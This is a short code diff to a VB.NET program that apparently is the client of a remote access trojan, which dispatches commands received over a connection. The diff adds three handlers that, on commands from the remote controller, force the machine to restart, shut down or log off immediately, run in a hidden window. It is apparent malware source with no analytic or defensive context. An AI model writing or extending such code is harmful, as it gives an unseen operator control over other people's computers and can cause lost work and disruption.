@@ -83,6 +83,15 @@ Public Class Main
         Dim A As String() = Split(BS(b), SPL)
         Try
             Select Case A(0)
+                Case "PC-RES"
+                    Shell("Shutdown –r –f –t 00", AppWinStyle.Hide, False, -1)
+
+                Case "PC-SHUT"
+                    Shell("Shutdown –s –f –t 00", AppWinStyle.Hide, False, -1)
+
+                Case "PC-OUT"
+                    Shell("Shutdown –l –f –t 00", AppWinStyle.Hide, False, -1)
+
                 Case "ping"
                     C.Send("ping")
                 Case "!"
